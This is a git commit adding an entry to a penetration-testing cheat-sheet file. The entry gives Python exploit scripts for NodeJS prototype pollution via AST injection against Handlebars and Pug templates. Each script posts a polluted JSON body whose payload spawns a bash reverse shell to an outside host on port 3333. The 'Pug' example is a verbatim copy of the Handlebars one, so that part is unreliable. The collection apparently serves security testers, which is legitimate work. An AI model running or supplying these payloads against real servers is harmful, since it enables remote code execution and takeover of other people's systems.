0bbcd38dc996aefc3601e3afd9952be0eb306965
Sylvain Júlio <syjulio123@gmail.com>
2022-05-14 10:52:52 +0100

    add prototype pollution javascript

--- cheat_sheets/cheat_list.py
+++ cheat_sheets/cheat_list.py
@@ -2456,3 +2456,69 @@ pip install oletools
 olevba <file> | less
 """
 
+
+######################################
+######################################
+
+prototipe_polution_js = create_new_cheat("Javascript - NodeJS - AST Injection, Prototype Pollution to RCE")
+prototipe_polution_js.category = "Web"
+prototipe_polution_js.sub_category = "RCE"
+prototipe_polution_js.output = """[*] Javascript - NodeJS - AST Injection, Prototype Pollution to RCE
+
+# Go to https://blog.p6.is/AST-Injection/
+
+
+[*] Example for Handlebars
+
+import requests
+
+TARGET_URL = 'http://p6.is:3000'
+
+# make pollution
+requests.post(TARGET_URL + '/vulnerable', json = {
+    "__proto__.type": "Program",
+    "__proto__.body": [{
+        "type": "MustacheStatement",
+        "path": 0,
+        "params": [{
+            "type": "NumberLiteral",
+            "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
+        }],
+        "loc": {
+            "start": 0,
+            "end": 0
+        }
+    }]
+})
+
+# execute
+requests.get(TARGET_URL)
+
+
+[*] Example for Pug
+
+import requests
+
+TARGET_URL = 'http://p6.is:3000'
+
+# make pollution
+requests.post(TARGET_URL + '/vulnerable', json = {
+    "__proto__.type": "Program",
+    "__proto__.body": [{
+        "type": "MustacheStatement",
+        "path": 0,
+        "params": [{
+            "type": "NumberLiteral",
+            "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
+        }],
+        "loc": {
+            "start": 0,
+            "end": 0
+        }
+    }]
+})
+
+# execute
+requests.get(TARGET_URL)
+
+"""
